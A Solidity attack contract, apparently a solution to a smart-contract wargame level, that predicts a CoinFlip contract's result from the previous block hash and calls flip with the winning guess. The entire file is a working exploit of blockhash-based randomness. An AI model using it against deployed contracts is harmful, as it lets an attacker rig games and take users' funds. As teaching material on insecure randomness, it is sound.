// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import the CoinFlip contract and the SafeMath library from OpenZeppelin
import "./CoinFlip.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

// CoinFlipAttack contract for exploiting the CoinFlip contract
contract CoinFlipAttack {
    using SafeMath for uint256;

    // Instance of the CoinFlip contract to be attacked
    CoinFlip public coinFlip;

    // The factor used for computing the coin flip result
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Constructor to set the target CoinFlip contract address
    constructor(address conFlipAddress) {
        coinFlip = CoinFlip(conFlipAddress);
    }

    // Function to call the flip function in CoinFlip with a calculated boolean value
    function IncreaseItBy1() public {
        coinFlip.flip(getBool());
    }

    // Function to generate a pseudo-random boolean value based on the previous block hash
    function getBool() private view returns (bool) {
        // Get the hash of the previous block
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // Calculate the pseudo-random number by dividing the block hash by the pre-defined factor
        uint256 coinFlip1 = blockValue.div(FACTOR);

        // Convert the result into a boolean value (true if equal to 1, false otherwise)
        bool side = coinFlip1 == 1 ? true : false;

        // Return the boolean value
        return side;
    }
}
